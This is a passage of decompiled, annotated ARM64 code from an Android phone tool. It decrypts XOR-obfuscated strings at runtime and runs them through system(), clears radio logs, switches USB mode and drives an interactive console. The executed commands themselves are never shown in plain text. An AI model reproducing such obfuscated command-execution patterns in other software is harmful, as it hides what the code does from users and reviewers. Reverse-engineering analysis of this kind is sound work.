                                                    CONCAT13((byte)((ulong)uVar11 >> 0x18) ^ bVar16,
                                                             CONCAT12((byte)((ulong)uVar11 >> 0x10)
                                                                      ^ bVar15,CONCAT11((byte)((
                                                  ulong)uVar11 >> 8) ^ bVar14,(byte)uVar11 ^ bVar13)
                                                  ))))));
    *(byte *)((long)puVar9 + 0x3c) = *(byte *)((long)puVar9 + 0x3c) ^ 0xe3;
    *(byte *)((long)puVar9 + 0x3d) = *(byte *)((long)puVar9 + 0x3d) ^ 0x41;
  }
  pcVar10 = (char *)FUN_002295c4(&DAT_002347b0);
  system(pcVar10);
  pbVar7 = (byte *)FUN_002295c4(&DAT_00234810);
  if ((*pbVar7 & 1) == 0) {
    puVar9 = (undefined8 *)FUN_002295c4(&DAT_002347f0);
    uVar11 = _DAT_00177460;
    puVar9[1] = _UNK_00177468;
    *puVar9 = uVar11;
    *(undefined4 *)(puVar9 + 2) = 0x119930b;
    FUN_002234c0(&LAB_001ab6bc,puVar9,0x2362d0);
    puVar12 = (undefined1 *)FUN_002295c4(&DAT_00234810);
    *puVar12 = 1;
  }
  pcVar10 = (char *)FUN_002295c4(&DAT_002347f0);
  FUN_001b5bf8();
  unlink(pcVar10);
  local_198 = 100000000;
  FUN_0020c368(&local_198);
  local_190 = &PTR_FUN_0022b888;
  local_e0[0] = &PTR_FUN_0022b8b0;
  FUN_0019918c(local_188);
  FUN_001cb780(&local_190,&PTR_PTR_0022b8c8);
  thunk_FUN_001c36f0(local_e0);
  if ((local_1b0[0] & 1) != 0) {
    free(local_1a0);
  }
  if (*(long *)(lVar3 + 0x28) != local_48) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001a5830
 * Purpose (EN): Radio Logcat Clear & USB Mode Switcher
 * Purpose (AR): مسح logcat -b radio وإعادة تشغيل نمط USB
 */

// Function: FUN_001a5830 @ 001a5830
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int FUN_001a5830(void)

{
  char cVar1;
  undefined8 uVar2;
  int iVar3;
  byte *pbVar4;
  char *pcVar5;
  long lVar6;
  undefined8 *puVar7;
  undefined8 uVar8;
  undefined1 *puVar9;
  byte bVar10;
  byte bVar11;
  byte bVar12;
  byte bVar13;
  byte bVar14;
  byte bVar15;
  byte bVar16;
  byte bVar17;
  byte bVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  undefined8 uVar24;
  undefined8 uVar25;
  undefined8 uVar26;
  undefined8 uVar27;
  
  pbVar4 = (byte *)FUN_002295c4(&DAT_002356d0);
  if ((*pbVar4 & 1) == 0) {
    puVar7 = (undefined8 *)FUN_002295c4(&DAT_002356b0);
    uVar25 = _UNK_001773c8;
    uVar24 = _DAT_001773c0;
    uVar2 = _UNK_00176ce8;
    uVar8 = _DAT_00176ce0;
    *(undefined1 *)((long)puVar7 + 0x24) = 1;
    puVar7[1] = uVar25;
    *puVar7 = uVar24;
    puVar7[3] = uVar2;
    puVar7[2] = uVar8;
    *(undefined4 *)(puVar7 + 4) = 0x8fc46545;
    FUN_002234c0(&LAB_001b2b38,puVar7,0x2362d0);
    puVar9 = (undefined1 *)FUN_002295c4(&DAT_002356d0);
    *puVar9 = 1;
  }
  pcVar5 = (char *)FUN_002295c4(&DAT_002356b0);
  FUN_001b5ee0();
  system(pcVar5);
  pbVar4 = (byte *)FUN_002295c4(&DAT_00235710);
  if ((*pbVar4 & 1) == 0) {
    uVar8 = FUN_002295c4(&DAT_002356f0);
    FUN_001b2b48(uVar8,&DAT_0017920c);
    FUN_002234c0(&LAB_001b2ccc,uVar8,0x2362d0);
    puVar9 = (undefined1 *)FUN_002295c4(&DAT_00235710);
    *puVar9 = 1;
    lVar6 = FUN_002295c4(&DAT_002356f0);
    cVar1 = *(char *)(lVar6 + 0x2f);
  }
  else {
    lVar6 = FUN_002295c4(&DAT_002356f0);
    cVar1 = *(char *)(lVar6 + 0x2f);
  }
  if (cVar1 != '\0') {
    puVar7 = (undefined8 *)FUN_002295c4(&DAT_002356f0);
    *(byte *)(puVar7 + 4) = *(byte *)(puVar7 + 4) ^ 0x21;
    uVar2 = _UNK_001772e8;
    uVar8 = _DAT_001772e0;
    *(byte *)((long)puVar7 + 0x21) = *(byte *)((long)puVar7 + 0x21) ^ 0xcb;
    *(byte *)((long)puVar7 + 0x22) = *(byte *)((long)puVar7 + 0x22) ^ 0xaf;
    *(byte *)((long)puVar7 + 0x23) = *(byte *)((long)puVar7 + 0x23) ^ 0x81;
    *(byte *)((long)puVar7 + 0x24) = *(byte *)((long)puVar7 + 0x24) ^ 0xa1;
    *(byte *)((long)puVar7 + 0x25) = *(byte *)((long)puVar7 + 0x25) ^ 0xf1;
    *(byte *)((long)puVar7 + 0x26) = *(byte *)((long)puVar7 + 0x26) ^ 0x43;
    uVar25 = puVar7[1];
    uVar24 = *puVar7;
    uVar27 = puVar7[3];
    uVar26 = puVar7[2];
    *(undefined1 *)((long)puVar7 + 0x2f) = 0;
    *(byte *)((long)puVar7 + 0x27) = *(byte *)((long)puVar7 + 0x27) ^ 0x49;
    *(byte *)(puVar7 + 5) = *(byte *)(puVar7 + 5) ^ 0x21;
    *(byte *)((long)puVar7 + 0x29) = *(byte *)((long)puVar7 + 0x29) ^ 0xcb;
    bVar10 = (byte)((ulong)uVar8 >> 8);
    bVar11 = (byte)((ulong)uVar8 >> 0x10);
    bVar12 = (byte)((ulong)uVar8 >> 0x18);
    bVar13 = (byte)((ulong)uVar8 >> 0x20);
    bVar14 = (byte)((ulong)uVar8 >> 0x28);
    bVar15 = (byte)((ulong)uVar8 >> 0x30);
    bVar16 = (byte)((ulong)uVar8 >> 0x38);
    bVar17 = (byte)((ulong)uVar2 >> 8);
    bVar18 = (byte)((ulong)uVar2 >> 0x10);
    bVar19 = (byte)((ulong)uVar2 >> 0x18);
    bVar20 = (byte)((ulong)uVar2 >> 0x20);
    bVar21 = (byte)((ulong)uVar2 >> 0x28);
    bVar22 = (byte)((ulong)uVar2 >> 0x30);
    bVar23 = (byte)((ulong)uVar2 >> 0x38);
    *(byte *)((long)puVar7 + 0x2a) = *(byte *)((long)puVar7 + 0x2a) ^ 0xaf;
    *(byte *)((long)puVar7 + 0x2b) = *(byte *)((long)puVar7 + 0x2b) ^ 0x81;
    *(byte *)((long)puVar7 + 0x2c) = *(byte *)((long)puVar7 + 0x2c) ^ 0xa1;
    puVar7[1] = CONCAT17((byte)((ulong)uVar25 >> 0x38) ^ bVar23,
                         CONCAT16((byte)((ulong)uVar25 >> 0x30) ^ bVar22,
                                  CONCAT15((byte)((ulong)uVar25 >> 0x28) ^ bVar21,
                                           CONCAT14((byte)((ulong)uVar25 >> 0x20) ^ bVar20,
                                                    CONCAT13((byte)((ulong)uVar25 >> 0x18) ^ bVar19,
                                                             CONCAT12((byte)((ulong)uVar25 >> 0x10)
                                                                      ^ bVar18,CONCAT11((byte)((
                                                  ulong)uVar25 >> 8) ^ bVar17,
                                                  (byte)uVar25 ^ (byte)uVar2)))))));
    *puVar7 = CONCAT17((byte)((ulong)uVar24 >> 0x38) ^ bVar16,
                       CONCAT16((byte)((ulong)uVar24 >> 0x30) ^ bVar15,
                                CONCAT15((byte)((ulong)uVar24 >> 0x28) ^ bVar14,
                                         CONCAT14((byte)((ulong)uVar24 >> 0x20) ^ bVar13,
                                                  CONCAT13((byte)((ulong)uVar24 >> 0x18) ^ bVar12,
                                                           CONCAT12((byte)((ulong)uVar24 >> 0x10) ^
                                                                    bVar11,CONCAT11((byte)((ulong)
                                                  uVar24 >> 8) ^ bVar10,(byte)uVar24 ^ (byte)uVar8))
                                                  )))));
    puVar7[3] = CONCAT17((byte)((ulong)uVar27 >> 0x38) ^ bVar23,
                         CONCAT16((byte)((ulong)uVar27 >> 0x30) ^ bVar22,
                                  CONCAT15((byte)((ulong)uVar27 >> 0x28) ^ bVar21,
                                           CONCAT14((byte)((ulong)uVar27 >> 0x20) ^ bVar20,
                                                    CONCAT13((byte)((ulong)uVar27 >> 0x18) ^ bVar19,
                                                             CONCAT12((byte)((ulong)uVar27 >> 0x10)
                                                                      ^ bVar18,CONCAT11((byte)((
                                                  ulong)uVar27 >> 8) ^ bVar17,
                                                  (byte)uVar27 ^ (byte)uVar2)))))));
    puVar7[2] = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar16,
                         CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar15,
                                  CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar14,
                                           CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar13,
                                                    CONCAT13((byte)((ulong)uVar26 >> 0x18) ^ bVar12,
                                                             CONCAT12((byte)((ulong)uVar26 >> 0x10)
                                                                      ^ bVar11,CONCAT11((byte)((
                                                  ulong)uVar26 >> 8) ^ bVar10,
                                                  (byte)uVar26 ^ (byte)uVar8)))))));
    *(byte *)((long)puVar7 + 0x2d) = *(byte *)((long)puVar7 + 0x2d) ^ 0xf1;
    *(byte *)((long)puVar7 + 0x2e) = *(byte *)((long)puVar7 + 0x2e) ^ 0x43;
  }
  pcVar5 = (char *)FUN_002295c4(&DAT_002356f0);
  system(pcVar5);
  pbVar4 = (byte *)FUN_002295c4(&DAT_00235750);
  if ((*pbVar4 & 1) == 0) {
    uVar8 = FUN_002295c4(&DAT_00235730);
    FUN_001b2cdc(uVar8,&DAT_0017923b);
    FUN_002234c0(&LAB_001b2e38,uVar8,0x2362d0);
    puVar9 = (undefined1 *)FUN_002295c4(&DAT_00235750);
    *puVar9 = 1;
  }
  pcVar5 = (char *)FUN_002295c4(&DAT_00235730);
  FUN_001b5f44();
  system(pcVar5);
  pbVar4 = (byte *)FUN_002295c4(&DAT_00235790);
  if ((*pbVar4 & 1) == 0) {
    uVar8 = FUN_002295c4(&DAT_00235770);
    FUN_001b2e48(uVar8,&DAT_00179265);
    FUN_002234c0(&LAB_001b2fc4,uVar8,0x2362d0);
    puVar9 = (undefined1 *)FUN_002295c4(&DAT_00235790);
    *puVar9 = 1;
    lVar6 = FUN_002295c4(&DAT_00235770);
    cVar1 = *(char *)(lVar6 + 0x2e);
  }
  else {
    lVar6 = FUN_002295c4(&DAT_00235770);
    cVar1 = *(char *)(lVar6 + 0x2e);
  }
  if (cVar1 != '\0') {
    puVar7 = (undefined8 *)FUN_002295c4(&DAT_00235770);
    uVar2 = _UNK_001770c8;
    uVar8 = _DAT_001770c0;
    *(byte *)(puVar7 + 4) = *(byte *)(puVar7 + 4) ^ 0x19;
    *(byte *)((long)puVar7 + 0x21) = *(byte *)((long)puVar7 + 0x21) ^ 0x7f;
    *(byte *)((long)puVar7 + 0x22) = *(byte *)((long)puVar7 + 0x22) ^ 0x4f;
    *(byte *)((long)puVar7 + 0x23) = *(byte *)((long)puVar7 + 0x23) ^ 0xa5;
    *(undefined1 *)((long)puVar7 + 0x2e) = 0;
    *(byte *)((long)puVar7 + 0x25) = *(byte *)((long)puVar7 + 0x25) ^ 0xad;
    *(byte *)((long)puVar7 + 0x24) = *(byte *)((long)puVar7 + 0x24) ^ 0xb5;
    uVar25 = puVar7[1];
    uVar24 = *puVar7;
    uVar27 = puVar7[3];
    uVar26 = puVar7[2];
    *(byte *)((long)puVar7 + 0x26) = *(byte *)((long)puVar7 + 0x26) ^ 0xcf;
    *(byte *)((long)puVar7 + 0x27) = *(byte *)((long)puVar7 + 0x27) ^ 0xb7;
    *(byte *)(puVar7 + 5) = *(byte *)(puVar7 + 5) ^ 0x19;
    bVar10 = (byte)((ulong)uVar8 >> 8);
    bVar11 = (byte)((ulong)uVar8 >> 0x10);
    bVar12 = (byte)((ulong)uVar8 >> 0x18);
    bVar13 = (byte)((ulong)uVar8 >> 0x20);
    bVar14 = (byte)((ulong)uVar8 >> 0x28);
    bVar15 = (byte)((ulong)uVar8 >> 0x30);
    bVar16 = (byte)((ulong)uVar8 >> 0x38);
    bVar17 = (byte)((ulong)uVar2 >> 8);
    bVar18 = (byte)((ulong)uVar2 >> 0x10);
    bVar19 = (byte)((ulong)uVar2 >> 0x18);
    bVar20 = (byte)((ulong)uVar2 >> 0x20);
    bVar21 = (byte)((ulong)uVar2 >> 0x28);
    bVar22 = (byte)((ulong)uVar2 >> 0x30);
    bVar23 = (byte)((ulong)uVar2 >> 0x38);
    *(byte *)((long)puVar7 + 0x29) = *(byte *)((long)puVar7 + 0x29) ^ 0x7f;
    *(byte *)((long)puVar7 + 0x2a) = *(byte *)((long)puVar7 + 0x2a) ^ 0x4f;
    puVar7[1] = CONCAT17((byte)((ulong)uVar25 >> 0x38) ^ bVar23,
                         CONCAT16((byte)((ulong)uVar25 >> 0x30) ^ bVar22,
                                  CONCAT15((byte)((ulong)uVar25 >> 0x28) ^ bVar21,
                                           CONCAT14((byte)((ulong)uVar25 >> 0x20) ^ bVar20,
                                                    CONCAT13((byte)((ulong)uVar25 >> 0x18) ^ bVar19,
                                                             CONCAT12((byte)((ulong)uVar25 >> 0x10)
                                                                      ^ bVar18,CONCAT11((byte)((
                                                  ulong)uVar25 >> 8) ^ bVar17,
                                                  (byte)uVar25 ^ (byte)uVar2)))))));
    *puVar7 = CONCAT17((byte)((ulong)uVar24 >> 0x38) ^ bVar16,
                       CONCAT16((byte)((ulong)uVar24 >> 0x30) ^ bVar15,
                                CONCAT15((byte)((ulong)uVar24 >> 0x28) ^ bVar14,
                                         CONCAT14((byte)((ulong)uVar24 >> 0x20) ^ bVar13,
                                                  CONCAT13((byte)((ulong)uVar24 >> 0x18) ^ bVar12,
                                                           CONCAT12((byte)((ulong)uVar24 >> 0x10) ^
                                                                    bVar11,CONCAT11((byte)((ulong)
                                                  uVar24 >> 8) ^ bVar10,(byte)uVar24 ^ (byte)uVar8))
                                                  )))));
    puVar7[3] = CONCAT17((byte)((ulong)uVar27 >> 0x38) ^ bVar23,
                         CONCAT16((byte)((ulong)uVar27 >> 0x30) ^ bVar22,
                                  CONCAT15((byte)((ulong)uVar27 >> 0x28) ^ bVar21,
                                           CONCAT14((byte)((ulong)uVar27 >> 0x20) ^ bVar20,
                                                    CONCAT13((byte)((ulong)uVar27 >> 0x18) ^ bVar19,
                                                             CONCAT12((byte)((ulong)uVar27 >> 0x10)
                                                                      ^ bVar18,CONCAT11((byte)((
                                                  ulong)uVar27 >> 8) ^ bVar17,
                                                  (byte)uVar27 ^ (byte)uVar2)))))));
    puVar7[2] = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar16,
                         CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar15,
                                  CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar14,
                                           CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar13,
                                                    CONCAT13((byte)((ulong)uVar26 >> 0x18) ^ bVar12,
                                                             CONCAT12((byte)((ulong)uVar26 >> 0x10)
                                                                      ^ bVar11,CONCAT11((byte)((
                                                  ulong)uVar26 >> 8) ^ bVar10,
                                                  (byte)uVar26 ^ (byte)uVar8)))))));
    *(byte *)((long)puVar7 + 0x2b) = *(byte *)((long)puVar7 + 0x2b) ^ 0xa5;
    *(byte *)((long)puVar7 + 0x2c) = *(byte *)((long)puVar7 + 0x2c) ^ 0xb5;
    *(byte *)((long)puVar7 + 0x2d) = *(byte *)((long)puVar7 + 0x2d) ^ 0xad;
  }
  pcVar5 = (char *)FUN_002295c4(&DAT_00235770);
  iVar3 = system(pcVar5);
  return iVar3;
}



// ----------------------------------------------------------------




// ============================================================================
// MODULE 6: Main Interactive Shell Loop (الحلقة التفاعلية المركزية)
// ============================================================================


/*
 * [PHONE FUNCTION] FUN_001a14d0
 * Purpose (EN): Central Interactive Console (# Prompt)
 * Purpose (AR): معالج سطر الأوامر التفاعلي وتوزيع أوامر المستخدم
 */

// Function: FUN_001a14d0 @ 001a14d0
// ----------------------------------------------------------------

/* WARNING: Type propagation algorithm not settling */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001a14d0(undefined8 param_1,long param_2)

{
  char cVar1;
  undefined1 uVar2;
  undefined1 uVar3;
  long lVar4;
  uint6 uVar5;
  uint3 uVar6;
  undefined8 uVar7;
  uint6 uVar8;
  uint3 uVar9;
  undefined1 auVar10 [16];
  undefined1 auVar11 [16];
  uint6 uVar12;
  uint3 uVar13;
  uint6 uVar14;
  uint3 uVar15;
  undefined1 auVar16 [16];
  undefined1 auVar17 [16];
  undefined *puVar18;
  ulong *puVar19;
  bool bVar20;
  undefined4 uVar21;
  int iVar22;
  byte *pbVar23;
  undefined8 uVar24;
  long lVar25;
  char *pcVar26;
  size_t sVar27;
  undefined1 (*pauVar28) [16];
  undefined1 *puVar29;
  undefined *puVar30;
  void *pvVar31;
  ulong uVar32;
  void *__src;
  undefined8 *puVar33;
  byte *pbVar34;
  undefined8 uVar35;
  undefined8 *puVar36;
  undefined8 uVar37;
  ulong uVar38;
  byte *pbVar39;
  ulong uVar40;
  ulong *puVar41;
  ulong *puVar42;
  byte *pbVar43;
  int iVar44;
  byte bVar45;
  undefined1 auVar46 [16];
  undefined1 auVar47 [16];
  undefined1 auVar48 [16];
  undefined1 auVar49 [16];
  undefined1 auVar50 [16];
  undefined1 auVar51 [16];
  undefined1 auVar52 [16];
  undefined1 auVar53 [16];
  undefined1 auVar54 [16];
  undefined1 auVar55 [16];
  undefined1 auVar56 [16];
  undefined1 auVar57 [16];
  undefined1 auVar58 [16];
  byte bVar59;
  byte bVar60;
  byte bVar61;
  byte bVar62;
  byte bVar63;
  byte bVar64;
  byte bVar65;
  byte bVar66;
  byte bVar67;
  byte bVar68;
  byte bVar69;
  byte bVar70;
  byte bVar71;
  byte bVar72;
  byte bVar73;
  byte bVar74;
  byte local_1220 [16];
  void *local_1210;
  byte local_1208 [16];
  void *local_11f8;
  byte local_11f0 [16];
  void *local_11e0;
  byte local_11d8 [16];
  void *local_11c8;
  byte local_11c0 [16];
  void *local_11b0;
  ulong *local_11a8;
  ulong *local_11a0;
  ulong *local_1198;
  byte local_1190 [16];
  void *local_1180;
  ulong local_1178;
  size_t sStack_1170;
  byte *local_1168;
  undefined8 local_1160;
  undefined6 uStack_1158;
  ulong local_1150;
  size_t sStack_1148;
  void *local_1140;
  byte local_150;
  byte bStack_14f;
  undefined4 uStack_14e;
  undefined2 uStack_14a;
  undefined6 uStack_148;
  undefined2 uStack_142;
  byte *local_140;
  undefined3 local_130;
  undefined5 uStack_12d;
  undefined3 uStack_128;
  undefined5 uStack_125;
  undefined8 local_120;
  undefined8 uStack_118;
  undefined8 local_110;
  undefined8 uStack_108;
  undefined8 local_100;
  undefined8 uStack_f8;
  undefined8 uStack_f0;
  undefined4 uStack_e8;
  undefined4 local_e4;
  undefined4 uStack_e0;
  undefined8 uStack_dc;
  char acStack_d4 [92];
  long local_78;
  
  lVar4 = tpidr_el0;
  local_78 = *(long *)(lVar4 + 0x28);
  FUN_001a5c50();
  uVar21 = FUN_001a63e0();
  pbVar43 = (byte *)(param_2 + 0x30);
  if ((*pbVar43 & 1) == 0) {
    pbVar43[0] = 0;
    pbVar43[1] = 0;
  }
  else {
    **(undefined1 **)(param_2 + 0x40) = 0;
    *(undefined8 *)(param_2 + 0x38) = 0;
  }
  FUN_002036bc(local_1190,param_2 + 0x60);
  pbVar23 = (byte *)FUN_002295c4(&DAT_00235d10);
  if ((*pbVar23 & 1) == 0) {
    uVar24 = FUN_002295c4(&DAT_00235cf0);
    FUN_001b4634(uVar24,&DAT_0017950d);
    FUN_002234c0(&LAB_001b46e8,uVar24,0x2362d0);
    puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235d10);
    *puVar29 = 1;
  }
  uVar24 = FUN_002295c4(&DAT_00235cf0);
  FUN_001b6198();
  __system_property_get(uVar24,acStack_d4);
  iVar22 = atoi(acStack_d4);
  uStack_dc = 0;
  uStack_e0 = 0;
  uStack_e8 = 0;
  local_e4 = 0;
  uStack_f0 = 0;
  uStack_f8 = 0;
  local_100 = 0;
  uStack_108 = 0;
  local_110 = 0;
  uStack_118 = 0;
  local_120 = 0;
  uStack_128 = 0;
  uStack_125 = 0;
  local_130 = 0;
  uStack_12d = 0;
  pbVar23 = (byte *)FUN_002295c4(&DAT_00235d50);
  if ((*pbVar23 & 1) == 0) {
    uVar24 = FUN_002295c4(&DAT_00235d30);
    FUN_001b46f4(uVar24,&DAT_00179522);
    FUN_002234c0(&LAB_001b4780,uVar24,0x2362d0);
    puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235d50);
    *puVar29 = 1;
    lVar25 = FUN_002295c4(&DAT_00235d30);
    cVar1 = *(char *)(lVar25 + 0x10);
  }
  else {
    lVar25 = FUN_002295c4(&DAT_00235d30);
    cVar1 = *(char *)(lVar25 + 0x10);
  }
  if (cVar1 != '\0') {
    pbVar23 = (byte *)FUN_002295c4(&DAT_00235d30);
    pbVar23[0x10] = 0;
    auVar58._0_8_ =
         CONCAT17(pbVar23[7] ^ DAT_001770f0._7_1_,
                  CONCAT16(pbVar23[6] ^ DAT_001770f0._6_1_,
                           CONCAT15(pbVar23[5] ^ DAT_001770f0._5_1_,
                                    CONCAT14(pbVar23[4] ^ DAT_001770f0._4_1_,
                                             CONCAT13(pbVar23[3] ^ DAT_001770f0._3_1_,
                                                      CONCAT12(pbVar23[2] ^ DAT_001770f0._2_1_,
                                                               CONCAT11(pbVar23[1] ^
                                                                        DAT_001770f0._1_1_,
                                                                        *pbVar23 ^ DAT_001770f0)))))
                          ));
    auVar58[8] = pbVar23[8] ^ DAT_001770f0._8_1_;
    auVar58[9] = pbVar23[9] ^ DAT_001770f0._9_1_;
    auVar58[10] = pbVar23[10] ^ DAT_001770f0._10_1_;
    auVar58[0xb] = pbVar23[0xb] ^ DAT_001770f0._11_1_;
    auVar58[0xc] = pbVar23[0xc] ^ DAT_001770f0._12_1_;
    auVar58[0xd] = pbVar23[0xd] ^ DAT_001770f0._13_1_;
    auVar58[0xe] = pbVar23[0xe] ^ DAT_001770f0._14_1_;
    auVar58[0xf] = pbVar23[0xf] ^ DAT_001770f0._15_1_;
    *(long *)(pbVar23 + 8) = auVar58._8_8_;
    *(undefined8 *)pbVar23 = auVar58._0_8_;
  }
  uVar24 = FUN_002295c4(&DAT_00235d30);
  __system_property_get(uVar24,&local_130);
  local_11a8 = (ulong *)0x0;
  local_11a0 = (ulong *)0x0;
  local_1198 = (ulong *)0x0;
  if (iVar22 < 0x1e) {
    if (iVar22 < 0x1a) {
      pbVar23 = (byte *)FUN_002295c4(&DAT_00235fd0);
      if ((*pbVar23 & 1) == 0) {
        uVar24 = FUN_002295c4(&DAT_00235fb0);
        FUN_001b5378(uVar24,&DAT_00179690);
        FUN_002234c0(&LAB_001b5424,uVar24,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235fd0);
        *puVar29 = 1;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00235fb0);
      FUN_001b64b8();
      sVar27 = strlen(pcVar26);
      if (0xffffffffffffffef < sVar27) goto LAB_001a33d4;
      if (sVar27 < 0x17) {
        pvVar31 = (void *)((ulong)&local_1150 | 1);
        local_1150 = CONCAT71(local_1150._1_7_,(char)((int)sVar27 << 1));
        if (sVar27 != 0) goto LAB_001a1cf8;
        goto LAB_001a2700;
      }
      uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
      pvVar31 = (void *)FUN_00202bc0(uVar32);
      local_1150 = uVar32 | 1;
      sStack_1148 = sVar27;
      local_1140 = pvVar31;
LAB_001a1cf8:
      puVar30 = &DAT_00235fb0;
    }
    else {
      pbVar23 = (byte *)FUN_002295c4(&DAT_00235f10);
      if ((*pbVar23 & 1) == 0) {
        uVar24 = FUN_002295c4(&DAT_00235ef0);
        FUN_001b4fd8(uVar24,&DAT_00179626);
        FUN_002234c0(&LAB_001b5084,uVar24,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235f10);
        *puVar29 = 1;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00235ef0);
      FUN_001b6458();
      sVar27 = strlen(pcVar26);
      if (0xffffffffffffffef < sVar27) goto LAB_001a33c0;
      if (sVar27 < 0x17) {
        pbVar23 = (byte *)((ulong)&local_1178 | 1);
        local_1178 = CONCAT71(local_1178._1_7_,(char)((int)sVar27 << 1));
        if (sVar27 != 0) goto LAB_001a1ba4;
      }
      else {
        uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
        pbVar23 = (byte *)FUN_00202bc0(uVar32);
        local_1178 = uVar32 | 1;
        sStack_1170 = sVar27;
        local_1168 = pbVar23;
LAB_001a1ba4:
        pvVar31 = (void *)FUN_002295c4(&DAT_00235ef0);
        memcpy(pbVar23,pvVar31,sVar27);
      }
      pbVar23[sVar27] = 0;
      FUN_00208ffc(&local_150,uVar21);
      uVar32 = (ulong)(local_150 >> 1);
      pbVar23 = (byte *)((ulong)&local_150 | 1);
      if ((local_150 & 1) != 0) {
        uVar32 = CONCAT26(uStack_142,uStack_148);
        pbVar23 = local_140;
      }
      pauVar28 = (undefined1 (*) [16])FUN_0020417c(&local_1178,pbVar23,uVar32);
      local_1140 = *(void **)pauVar28[1];
      sStack_1148 = SUB168(*pauVar28,8);
      local_1150 = SUB168(*pauVar28,0);
      *(undefined8 *)(*pauVar28 + 8) = 0;
      *(undefined8 *)pauVar28[1] = 0;
      *(undefined8 *)*pauVar28 = 0;
      if (local_11a0 < local_1198) {
        local_11a0[2] = (ulong)local_1140;
        local_11a0[1] = sStack_1148;
        *local_11a0 = local_1150;
        sStack_1148 = 0;
        local_1140 = (void *)0x0;
        local_1150 = 0;
        local_11a0 = local_11a0 + 3;
joined_r0x001a30ac:
        if ((local_150 & 1) == 0) goto LAB_001a1d20;
LAB_001a1c4c:
        free(local_140);
        if ((local_1178 & 1) == 0) goto LAB_001a1d28;
LAB_001a1c5c:
        free(local_1168);
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235f50);
        if ((*pbVar23 & 1) != 0) goto LAB_001a1d3c;
LAB_001a1c78:
        uVar24 = FUN_002295c4(&DAT_00235f30);
        FUN_001b5090(uVar24,&DAT_0017963a);
        FUN_002234c0(&LAB_001b51f4,uVar24,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235f50);
        *puVar29 = 1;
        lVar25 = FUN_002295c4(&DAT_00235f30);
        cVar1 = *(char *)(lVar25 + 0x2b);
      }
      else {
        FUN_001b6204(&local_11a8,&local_1150);
        if ((local_1150 & 1) != 0) {
          free(local_1140);
          goto joined_r0x001a30ac;
        }
        if ((local_150 & 1) != 0) goto LAB_001a1c4c;
LAB_001a1d20:
        if ((local_1178 & 1) != 0) goto LAB_001a1c5c;
LAB_001a1d28:
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235f50);
        if ((*pbVar23 & 1) == 0) goto LAB_001a1c78;
LAB_001a1d3c:
        lVar25 = FUN_002295c4(&DAT_00235f30);
        cVar1 = *(char *)(lVar25 + 0x2b);
      }
      if (cVar1 != '\0') {
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235f30);
        bVar74 = UNK_0017710f;
        bVar73 = UNK_0017710e;
        bVar72 = UNK_0017710d;
        bVar71 = UNK_0017710c;
        bVar70 = UNK_0017710b;
        bVar69 = UNK_0017710a;
        bVar68 = UNK_00177109;
        bVar67 = UNK_00177108;
        bVar66 = UNK_00177107;
        bVar65 = UNK_00177106;
        bVar64 = UNK_00177105;
        bVar63 = UNK_00177104;
        bVar62 = UNK_00177103;
        bVar61 = UNK_00177102;
        bVar60 = UNK_00177101;
        bVar59 = DAT_00177100;
        pbVar23[0x20] = pbVar23[0x20] ^ 0xcd;
        pbVar23[0x21] = pbVar23[0x21] ^ 9;
        pbVar23[0x23] = pbVar23[0x23] ^ 0x23;
        pbVar23[0x22] = pbVar23[0x22] ^ 0xb1;
        uVar7 = *(undefined8 *)(pbVar23 + 0x18);
        uVar24 = *(undefined8 *)(pbVar23 + 0x10);
        pbVar23[0x24] = pbVar23[0x24] ^ 0xd9;
        pbVar23[0x25] = pbVar23[0x25] ^ 0x47;
        pbVar23[0x2b] = 0;
        pbVar23[0x26] = pbVar23[0x26] ^ 0x3b;
        auVar55._0_8_ =
             CONCAT17(pbVar23[7] ^ bVar66,
                      CONCAT16(pbVar23[6] ^ bVar65,
                               CONCAT15(pbVar23[5] ^ bVar64,
                                        CONCAT14(pbVar23[4] ^ bVar63,
                                                 CONCAT13(pbVar23[3] ^ bVar62,
                                                          CONCAT12(pbVar23[2] ^ bVar61,
                                                                   CONCAT11(pbVar23[1] ^ bVar60,
                                                                            *pbVar23 ^ bVar59)))))))
        ;
        auVar55[8] = pbVar23[8] ^ bVar67;
        auVar55[9] = pbVar23[9] ^ bVar68;
        auVar55[10] = pbVar23[10] ^ bVar69;
        auVar55[0xb] = pbVar23[0xb] ^ bVar70;
        auVar55[0xc] = pbVar23[0xc] ^ bVar71;
        auVar55[0xd] = pbVar23[0xd] ^ bVar72;
        auVar55[0xe] = pbVar23[0xe] ^ bVar73;
        auVar55[0xf] = pbVar23[0xf] ^ bVar74;
        auVar49._0_8_ =
             CONCAT17((byte)((ulong)uVar24 >> 0x38) ^ bVar66,
                      CONCAT16((byte)((ulong)uVar24 >> 0x30) ^ bVar65,
                               CONCAT15((byte)((ulong)uVar24 >> 0x28) ^ bVar64,
                                        CONCAT14((byte)((ulong)uVar24 >> 0x20) ^ bVar63,
                                                 CONCAT13((byte)((ulong)uVar24 >> 0x18) ^ bVar62,
                                                          CONCAT12((byte)((ulong)uVar24 >> 0x10) ^
                                                                   bVar61,CONCAT11((byte)((ulong)
